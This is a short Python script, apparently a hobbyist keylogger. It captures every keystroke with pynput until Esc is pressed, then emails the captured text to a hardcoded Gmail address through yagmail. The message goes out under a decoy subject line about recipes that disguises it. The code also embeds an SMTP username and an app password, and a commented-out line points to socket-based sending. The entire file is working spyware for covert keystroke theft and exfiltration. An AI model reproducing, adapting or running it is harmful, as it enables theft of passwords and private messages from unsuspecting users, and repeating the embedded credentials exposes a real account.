import pynput
from pynput.keyboard import Listener, Key
import socket
import email
import yagmail
import datetime as dt

today=dt.datetime.now().strftime('%Y-%m-%d %H:%M')
r=('\n')*4

class Email:
    def __init__(self,email):
        self.email=email

    def send_email(self,testo):
        self.testo=testo
        email= yagmail.SMTP(user='dariojava99', password='peqhxybjekikvqjn')
        email.send(to=self.email, subject='Thanks to use my site, these are the recipes!', contents=self.testo+r+today)


sendemail = Email("a.rotili94@gmail.com")

class TestoEmail:
    testo = ""

    def aggiungiStringa(keyChar):
        return keyChar

def press(key):
    if key == Key.space:
        TestoEmail.testo +=" "
    elif key == Key.enter:
        TestoEmail.testo += "\n" 
    elif key == Key.shift:
        TestoEmail.testo += ""      
    else:    
        TestoEmail.testo += TestoEmail.aggiungiStringa(str(key))  
    print(key)
    
    #s.send(str(key).encode())

def release(key):
    if key == Key.esc:
        return False

with Listener(on_press = press, on_release = release) as listener:
    listener.join()

print(TestoEmail.testo)   
TestoEmail.testo
sendemail.send_email(TestoEmail.testo.replace("'","")) 



